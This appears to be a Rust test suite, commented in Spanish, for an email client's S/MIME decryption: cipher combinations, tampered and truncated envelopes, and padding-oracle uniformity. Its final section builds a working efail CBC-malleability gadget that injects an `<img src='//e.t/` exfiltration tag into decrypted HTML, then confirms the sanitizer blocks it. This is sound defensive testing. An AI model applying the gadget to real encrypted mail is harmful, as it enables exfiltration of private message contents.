//! Pruebas de `decrypt_message` contra sobres reales de openssl (en
//! `tests/fixtures/smime/`, cifrados a `rsa-pbes2.p12`) y contra sobres
//! **manipulados a propósito** desde ésos. Lo que hay que sostener:
//!
//! - cada combinación que el correo emite de verdad abre (PKCS#1 v1.5 y OAEP
//!   SHA-1/SHA-256 para la clave; AES-128/192/256-CBC para el contenido);
//! - lo que no se puede abrir (ECC, AES-GCM, 3DES, sin clave, manipulado,
//!   truncado) cae **siempre** en `Unavailable`, nunca en pánico ni en
//!   `NotEncrypted` (que mostraría el blob como si fuera un mensaje en claro);
//! - los fallos que un atacante podría usar de oráculo (relleno RSA, relleno CBC,
//!   destinatario equivocado) no se distinguen hacia afuera.

use super::test_support::*;
use super::*;
use crate::store::smime_key::parse_pkcs12;

const AES256: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-aes256.eml");
const AES192: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-aes192.eml");
const AES128: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-aes128.eml");
const OAEP_SHA1: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-oaep.eml");
const OAEP_SHA256: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-oaep-sha256.eml");
const MULTI: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-multi.eml");
const OTHER_RECIPIENT: &[u8] =
    include_bytes!("../../tests/fixtures/smime/enc-rsa-otro-destinatario.eml");
const ECC: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-ecc-recipient.eml");
const GCM: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-gcm.eml");
const HTML: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-html.eml");
const TRIPLE_DES: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-3des.eml");
const TAMPERED: &[u8] = include_bytes!("../../tests/fixtures/smime/enc-rsa-manipulado.eml");
const SIGNED_AND_ENCRYPTED: &[u8] =
    include_bytes!("../../tests/fixtures/smime/enc-rsa-firmado.eml");
const OTHER_CERT_PEM: &str = include_str!("../../tests/fixtures/smime/otro-cert.pem");

/// Nuestra identidad: la que abre los sobres de los fixtures. Se parsea una sola
/// vez (el `.p12` hace KDF, y los recortes de abajo descifran cientos de veces).
fn ours() -> (Zeroizing<Vec<u8>>, Vec<u8>) {
    static IDENTITY: std::sync::OnceLock<(Vec<u8>, Vec<u8>)> = std::sync::OnceLock::new();
    let (key, cert) = IDENTITY.get_or_init(|| {
        let id = parse_pkcs12(RSA_P12, PASSWORD).expect("el .p12 de prueba parsea");
        (id.private_key_pkcs8.to_vec(), id.certs[0].clone())
    });
    (Zeroizing::new(key.clone()), cert.clone())
}

fn decrypt(raw: &[u8]) -> Decryption {
    let (key, cert) = ours();
    decrypt_message(raw, &key, &cert)
}

fn opened(raw: &[u8]) -> String {
    match decrypt(raw) {
        Decryption::Opened(plain) => {
            String::from_utf8(plain.to_vec()).expect("el contenido es UTF-8")
        }
        other => panic!("se esperaba Opened, dio {other:?}"),
    }
}

/// El texto del cuerpo del contenido descifrado (la entidad MIME de adentro).
fn text_of(plain: &str) -> String {
    crate::message::plain_text(plain.as_bytes())
        .trim()
        .to_string()
}

fn pem_to_der(pem: &str) -> Vec<u8> {
    let b64: String = pem.lines().filter(|l| !l.starts_with("-----")).collect();
    BASE64_STANDARD.decode(b64).expect("PEM válido")
}

// ── Armar y desarmar sobres para manipularlos ──────────────────────────

/// Los headers del mensaje y el DER del `ContentInfo` de un fixture.
fn split_eml(eml: &[u8]) -> (String, Vec<u8>) {
    let text = String::from_utf8(eml.to_vec()).expect("el fixture es ASCII");
    let (headers, body) = text
        .split_once("\n\n")
        .or_else(|| text.split_once("\r\n\r\n"))
        .expect("headers y cuerpo");
    let b64: String = body.split_whitespace().collect();
    (
        headers.to_string(),
        BASE64_STANDARD.decode(b64).expect("base64 válido"),
    )
}

fn join_eml(headers: &str, der: &[u8]) -> Vec<u8> {
    format!(
        "{headers}\n\n{}\n",
        crate::compose::wrap_base64(&BASE64_STANDARD.encode(der))
    )
    .into_bytes()
}

/// Abre el fixture, deja que `edit` toque el `EnvelopedData` y lo vuelve a armar
/// con los mismos headers.
fn mutate(eml: &[u8], edit: impl FnOnce(&mut EnvelopedData)) -> Vec<u8> {
    let (headers, der) = split_eml(eml);
    let ci = ContentInfo::from_der(&der).expect("ContentInfo");
    let mut ed = EnvelopedData::from_der(&ci.content.to_der().unwrap()).expect("EnvelopedData");
    edit(&mut ed);
    let ci = ContentInfo {
        content_type: ID_ENVELOPED_DATA,
        content: der::Any::encode_from(&ed).expect("EnvelopedData a DER"),
    };
    join_eml(&headers, &ci.to_der().unwrap())
}

/// Edita el (único) `RecipientInfo` de transporte de clave de un sobre de un solo
/// destinatario.
fn edit_ktri(
    ed: &mut EnvelopedData,
    edit: impl FnOnce(&mut cms::enveloped_data::KeyTransRecipientInfo),
) {
    let mut infos: Vec<RecipientInfo> = ed.recip_infos.0.iter().cloned().collect();
    assert_eq!(infos.len(), 1, "el fixture tiene un solo destinatario");
    match &mut infos[0] {
        RecipientInfo::Ktri(ktri) => edit(ktri),
        other => panic!("se esperaba transporte de clave, hay {other:?}"),
    }
    ed.recip_infos.0 = der::asn1::SetOfVec::try_from(infos).expect("un solo elemento");
}

/// El transporte de clave roto: un bit del RSA cifrado cambiado, así el relleno
/// PKCS#1 v1.5 no cierra.
fn bad_rsa_unpad() -> Vec<u8> {
    mutate(AES256, |ed| {
        edit_ktri(ed, |ktri| {
            let mut bytes = ktri.enc_key.as_bytes().to_vec();
            bytes[10] ^= 0x01;
            ktri.enc_key = OctetString::new(bytes).unwrap();
        })
    })
}

/// El contenido roto: se cambia el último byte del **penúltimo** bloque, que en
/// CBC cambia justo el byte de relleno del último. Es determinista: el relleno
/// PKCS#7 no puede cerrar.
fn bad_cbc_unpad() -> Vec<u8> {
    mutate(AES256, |ed| {
        let octets = ed.encrypted_content.encrypted_content.as_ref().unwrap();
        let mut bytes = octets.as_bytes().to_vec();
        assert!(bytes.len() >= 32, "el fixture tiene al menos dos bloques");
        let at = bytes.len() - 17;
        bytes[at] ^= 0x01;
        ed.encrypted_content.encrypted_content = Some(OctetString::new(bytes).unwrap());
    })
}

// ── 1. Cada combinación de clave y cifrado abre ────────────────────────

#[test]
fn rsa_pkcs1v15_con_aes_128_192_y_256_se_descifra_al_texto_exacto() {
    for (name, raw, expected) in [
        ("aes-128", AES128, "mensaje secreto para descifrar"),
        ("aes-192", AES192, "mensaje secreto de prueba"),
        ("aes-256", AES256, "mensaje secreto para descifrar"),
    ] {
        let plain = opened(raw);
        assert_eq!(text_of(&plain), expected, "{name}: {plain:?}");
    }
}

#[test]
fn rsa_oaep_con_sha1_y_con_sha256_se_descifra() {
    // SHA-1 es el valor por omisión de openssl (sin parámetros en el sobre); el
    // de SHA-256 trae el hash y el MGF1 explícitos.
    assert_eq!(
        text_of(&opened(OAEP_SHA1)),
        "mensaje secreto para descifrar"
    );
    assert_eq!(text_of(&opened(OAEP_SHA256)), "mensaje secreto de prueba");
}

// ── 3. sign-then-encrypt ───────────────────────────────────────────────

#[test]
fn un_sobre_con_firma_adentro_se_descifra_y_el_contenido_se_verifica_contra_el_from_de_afuera() {
    let plain = opened(SIGNED_AND_ENCRYPTED);
    // El contenido de adentro es un `pkcs7-mime` firmado: no trae `From`.
    assert_eq!(message_from(plain.as_bytes()), "");
    assert_eq!(
        verify_message_with_from(plain.as_bytes(), &message_from(SIGNED_AND_ENCRYPTED)),
        Verification::SignedUntrusted(RSA_ADDRESS.into()),
        "firmado por el From del sobre de afuera, sin confianza X.509"
    );
}

#[test]
fn la_firma_de_adentro_no_liga_con_un_from_de_afuera_ajeno_ni_con_uno_vacio() {
    let plain = opened(SIGNED_AND_ENCRYPTED);
    for from in ["atacante@otro.test", ""] {
        let verification = verify_message_with_from(plain.as_bytes(), from);
        assert!(
            matches!(verification, Verification::Unverified(_)),
            "From {from:?}: dio {verification:?}"
        );
    }
}

// ── 4 y 5. Lo que no se puede abrir cae a Unavailable, sin pánico ──────

fn assert_unavailable(raw: &[u8], what: &str) {
    match decrypt(raw) {
        Decryption::Unavailable(_) => {}
        other => panic!("{what}: se esperaba Unavailable, dio {other:?}"),
    }
}

#[test]
fn un_destinatario_ecc_no_se_abre() {
    assert_unavailable(ECC, "ECC (Kari)");
}

#[test]
fn un_sobre_manipulado_no_se_abre() {
    assert_unavailable(TAMPERED, "sobre manipulado");
}

#[test]
fn un_cifrado_que_no_soportamos_dentro_de_un_sobre_normal_no_se_abre() {
    // 3DES-CBC va dentro de un EnvelopedData normal: cae por el cifrado no
    // soportado.
    assert_unavailable(TRIPLE_DES, "3DES-CBC");
}

/// **BUG conocido, sin arreglar** (ver el reporte de qa del PR): AES-GCM es
/// `AuthEnvelopedData` (OID `id-ct-authEnvelopedData`, `smime-type=authEnveloped-data`),
/// y `decrypt_message` lo toma por «no cifrado» porque sólo reconoce el OID de
/// `EnvelopedData`. El correo queda sin marca de cifrado y se muestra el blob.
/// Debe dar `Unavailable` (estado 2). Se saca el `ignore` al arreglarlo.
#[test]
#[ignore = "BUG: AuthEnvelopedData (AES-GCM) se toma por no cifrado; debe ser Unavailable"]
fn aes_gcm_se_marca_cifrado_no_se_pudo_abrir() {
    assert!(
        is_enveloped(GCM),
        "un AuthEnvelopedData también es un sobre cifrado"
    );
    assert_unavailable(GCM, "AES-GCM (AuthEnvelopedData)");
}

// ── 6. Truncado en cualquier punto ─────────────────────────────────────

#[test]
fn un_sobre_truncado_en_cualquier_byte_no_entra_en_panico_y_queda_cifrado_sin_abrir() {
    let (headers, der) = split_eml(AES256);
    for cut in 0..der.len() {
        let raw = join_eml(&headers, &der[..cut]);
        assert_unavailable(&raw, &format!("DER cortado en {cut}/{}", der.len()));
        assert!(is_enveloped(&raw), "DER cortado en {cut}");
    }
}

#[test]
fn un_mensaje_cortado_a_mitad_del_base64_no_entra_en_panico() {
    // Cortes del mensaje entero, también dentro de los headers y en medio de una
    // línea base64 (largo no múltiplo de 4). Después de los headers sigue siendo
    // «cifrado, no se pudo abrir»; antes no hay Content-Type y no es nada.
    let text = String::from_utf8(AES256.to_vec()).unwrap();
    let body_start = text
        .find("\r\n\r\n")
        .map(|i| i + 4)
        .or_else(|| text.find("\n\n").map(|i| i + 2))
        .expect("fin de headers");
    for cut in 0..AES256.len() {
        let out = decrypt(&AES256[..cut]);
        if cut > body_start {
            assert!(
                matches!(out, Decryption::Unavailable(_) | Decryption::Opened(_)),
                "cortado en {cut}: {out:?}"
            );
        }
    }
    // Cortado un byte antes del final del base64 (pierde el relleno `=`/la última
    // letra): el sobre ya no es válido.
    let truncated = &AES256[..AES256.len() - 6];
    assert_unavailable(truncated, "cola del base64 perdida");
}

// ── 7. Varios destinatarios ────────────────────────────────────────────

#[test]
fn con_varios_destinatarios_se_encuentra_el_nuestro_aunque_no_sea_el_primero() {
    // El fixture se cifró a otro RSA (CN=A, que ordena antes), a nuestro cert y a
    // un ECC (Kari). Se comprueba que la propiedad que se quiere probar vale.
    let (_, der) = split_eml(MULTI);
    let ci = ContentInfo::from_der(&der).unwrap();
    let ed = EnvelopedData::from_der(&ci.content.to_der().unwrap()).unwrap();
    let (_, our_cert) = ours();
    let ours_rid = recipient_id(&our_cert).unwrap();
    let infos = ed.recip_infos.0.as_slice();
    assert_eq!(infos.len(), 3);
    let position = infos
        .iter()
        .position(|r| matches!(r, RecipientInfo::Ktri(k) if k.rid == ours_rid))
        .expect("somos uno de los destinatarios");
    assert_ne!(position, 0, "no somos el primero");
    assert!(
        infos.iter().any(|r| matches!(r, RecipientInfo::Kari(_))),
        "y hay uno ECC en la lista"
    );

    assert_eq!(text_of(&opened(MULTI)), "mensaje secreto de prueba");
}

// ── 9. Un solo error hacia afuera ──────────────────────────────────────

#[test]
fn relleno_rsa_relleno_cbc_y_destinatario_equivocado_son_el_mismo_resultado() {
    let causes: [(&str, Vec<u8>); 3] = [
        ("relleno RSA", bad_rsa_unpad()),
        ("relleno CBC", bad_cbc_unpad()),
        ("destinatario equivocado", OTHER_RECIPIENT.to_vec()),
    ];
    // Los tres fixtures de falla son sobres bien formados: fallan **por su causa**,
    // no porque no parseen. Y el original sin tocar sí abre (el sabotaje es lo que
    // lo rompe).
    assert!(matches!(decrypt(AES256), Decryption::Opened(_)));
    for (cause, raw) in &causes {
        let (_, der) = split_eml(raw);
        let ci = ContentInfo::from_der(&der).unwrap();
        EnvelopedData::from_der(&ci.content.to_der().unwrap())
            .unwrap_or_else(|e| panic!("{cause}: el sobre debe parsear: {e}"));
        assert_unavailable(raw, cause);
    }
}

#[test]
fn el_motivo_del_fallo_nunca_llega_a_lo_que_se_guarda_ni_a_la_ventana() {
    // Lo que sale hacia afuera de `opened_rows_decrypting` (lo que se guarda y lo
    // que lee la ventana) es idéntico para las tres causas: el motivo sólo va al
    // diario. Un oráculo de relleno necesita poder distinguirlas.
    let (key, cert) = ours();
    let material = crate::email_sync::SmimeMaterial { key, cert };
    let rows: Vec<_> = [bad_rsa_unpad(), bad_cbc_unpad(), OTHER_RECIPIENT.to_vec()]
        .iter()
        .map(|raw| crate::email_sync::opened_rows_decrypting(1, raw, false, Some(&material)))
        .collect();
    assert_eq!(rows[0].0.smime_encrypted, Some(2));
    assert_eq!(rows[0].0, rows[1].0);
    assert_eq!(rows[1].0, rows[2].0);
}

// ── 8. Sin la clave que corresponde ────────────────────────────────────

#[test]
fn sin_nuestra_clave_o_con_la_que_no_es_no_se_abre() {
    let (key, cert) = ours();
    let ec = parse_pkcs12(EC_P12, PASSWORD).unwrap();

    // Una clave EC donde se espera la RSA.
    assert!(matches!(
        decrypt_message(AES256, &ec.private_key_pkcs8, &cert),
        Decryption::Unavailable(_)
    ));
    // Un certificado que no es el del sobre (otro RSA; y uno EC).
    for foreign in [pem_to_der(OTHER_CERT_PEM), ec.certs[0].clone()] {
        assert!(matches!(
            decrypt_message(AES256, &key, &foreign),
            Decryption::Unavailable(_)
        ));
    }
    // Basura en lugar de clave o de certificado: sin pánico.
    assert!(matches!(
        decrypt_message(AES256, b"no soy una clave", &cert),
        Decryption::Unavailable(_)
    ));
    assert!(matches!(
        decrypt_message(AES256, &key, b"no soy un certificado"),
        Decryption::Unavailable(_)
    ));
    assert!(matches!(
        decrypt_message(AES256, &[], &[]),
        Decryption::Unavailable(_)
    ));
}

// ── Clasificación (`is_enveloped`, `NotEncrypted`) ─────────────────────

#[test]
fn lo_firmado_y_lo_en_claro_no_son_un_sobre() {
    let (key, cert) = ours();
    let signed = sign(RSA_P12, &draft(RSA_ADDRESS, "hola firmado"));
    let opaque_signed = opaque(&signed, "application/pkcs7-mime");
    for (what, raw) in [
        ("multipart/signed", signed.message.as_bytes()),
        ("pkcs7-mime firmado", opaque_signed.as_bytes()),
        ("texto plano", b"From: a@b.test\r\n\r\nhola".as_slice()),
        ("vacío", b"".as_slice()),
    ] {
        assert!(!is_enveloped(raw), "{what}");
        assert!(
            matches!(decrypt_message(raw, &key, &cert), Decryption::NotEncrypted),
            "{what}"
        );
    }
    assert!(is_enveloped(AES256));
    assert!(
        is_enveloped(TAMPERED),
        "manipulado pero con smime-type de sobre"
    );
}

#[test]
fn un_pkcs7_mime_que_no_parsea_y_no_dice_ser_un_sobre_no_se_toma_por_cifrado() {
    // Sin `smime-type=enveloped-data` y sin un CMS legible no hay motivo para
    // llamarlo cifrado (es un firmado roto, o basura): no se marca.
    let raw = b"Content-Type: application/pkcs7-mime; smime-type=signed-data\r\n\r\nAAAA\r\n";
    assert!(!is_enveloped(raw));
    assert!(matches!(decrypt(raw), Decryption::NotEncrypted));
}

// ── efail: la maleabilidad de AES-CBC no abre un canal de exfiltración ──

fn material() -> crate::email_sync::SmimeMaterial {
    let (key, cert) = ours();
    crate::email_sync::SmimeMaterial { key, cert }
}

fn find(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}

/// Cambia el byte `at` del ciphertext AES-CBC del sobre, con la CEK intacta.
fn flip_ciphertext(eml: &[u8], at: usize) -> Vec<u8> {
    mutate(eml, |ed| {
        let mut bytes = ed
            .encrypted_content
            .encrypted_content
            .as_ref()
            .unwrap()
            .as_bytes()
            .to_vec();
        bytes[at] ^= 0x01;
        ed.encrypted_content.encrypted_content = Some(OctetString::new(bytes).unwrap());
    })
}

#[test]
fn un_ciphertext_cbc_con_un_byte_cambiado_abre_a_basura_y_no_rompe_nada() {
    // Un byte del bloque 1 (no de los dos últimos): el relleno sigue cerrando, así
    // que **abre**, con el bloque 1 destrozado y un bit cambiado en el 2.
    let original = opened(HTML);
    let tampered = flip_ciphertext(HTML, 20);
    let Decryption::Opened(garbage) = decrypt(&tampered) else {
        panic!("con el relleno intacto tiene que abrir")
    };
    assert_ne!(garbage.as_slice(), original.as_bytes());
    assert_eq!(garbage.len(), original.len(), "mismo largo");

    // Lo que se guarda: abierto, y lo que sale como HTML pasó por el saneador.
    let (body, _) =
        crate::email_sync::opened_rows_decrypting(1, &tampered, false, Some(&material()));
    assert_eq!(body.smime_encrypted, Some(1));
    if let Some(html) = body.html_body {
        assert!(!html.contains(" src="), "{html}");
        assert!(!html.contains("<script"), "{html}");
    }
}

/// El ataque efail contra S/MIME, armado de verdad: sin la clave pero **sabiendo
/// el texto en claro** (acá el nuestro, que lo conocemos), el que manda el
/// ciphertext cambia los bloques anteriores para que el bloque `k` descifre a lo
/// que él quiera (`P'_k = P_k ^ C_{k-1} ^ C'_{k-1}`), a costa de dejar basura en
/// el bloque `k-1`. Se inyecta `<img src='//e.t/` en el bloque 4 y el cierre
/// `'>` en el 6, con los encabezados MIME (bloques 0-2) intactos.
fn efail_gadget() -> Vec<u8> {
    let known = opened(HTML).into_bytes();
    assert!(
        known.len() >= 112,
        "el texto conocido cubre hasta el bloque 6"
    );
    mutate(HTML, |ed| {
        let mut ct = ed
            .encrypted_content
            .encrypted_content
            .as_ref()
            .unwrap()
            .as_bytes()
            .to_vec();
        for (previous, target, wanted) in [
            (3usize, 4usize, b"<img src='//e.t/"),
            (5, 6, b"'>exfil-ok-ok-ok"),
        ] {
            for j in 0..16 {
                ct[16 * previous + j] ^= known[16 * target + j] ^ wanted[j];
            }
        }
        ed.encrypted_content.encrypted_content = Some(OctetString::new(ct).unwrap());
    })
}

#[test]
fn el_ataque_efail_sobre_cbc_descifra_lo_inyectado_pero_sale_saneado_sin_carga_remota() {
    let attack = efail_gadget();

    // El ataque **funciona** a nivel de descifrado: CBC sin autenticación es
    // maleable, y la clave de contenido está intacta. No es una prueba vacía.
    let Decryption::Opened(plain) = decrypt(&attack) else {
        panic!("el relleno quedó intacto: tiene que abrir")
    };
    assert!(
        find(&plain, b"<img src='//e.t/"),
        "el gadget inyectó el <img>"
    );
    assert!(find(&plain, b"'>exfil-ok-ok-ok"), "y su cierre");

    // Lo que llega a la ventana: el HTML pasa por el saneador, que deja la imagen
    // sin `src` cargable (la dirección queda en `data-vsk-src`, inerte).
    let (body, _) = crate::email_sync::opened_rows_decrypting(1, &attack, false, Some(&material()));
    assert_eq!(body.smime_encrypted, Some(1));
    let html = body
        .html_body
        .expect("los encabezados MIME siguen intactos: hay HTML");
    assert!(!html.contains(" src="), "quedó un src cargable: {html}");
    assert!(!html.contains(" src='"), "quedó un src cargable: {html}");
    assert!(
        !html.contains("<script") && !html.contains("onerror"),
        "{html}"
    );

    // Y el saneador reconoció la imagen remota: la contó y la guardó aparte (si
    // no, esta prueba pasaría porque el `<img>` se perdió y no porque se bloqueó).
    let raw_html = crate::message::html_part(&plain).expect("html_part");
    let sanitized = crate::html::sanitize(&raw_html);
    assert_eq!(sanitized.blocked_images, 1, "{}", sanitized.html);
    assert!(
        sanitized.html.contains(crate::html::REMOTE_SRC_ATTRIBUTE),
        "{}",
        sanitized.html
    );
    assert_eq!(sanitized.html, html);
}
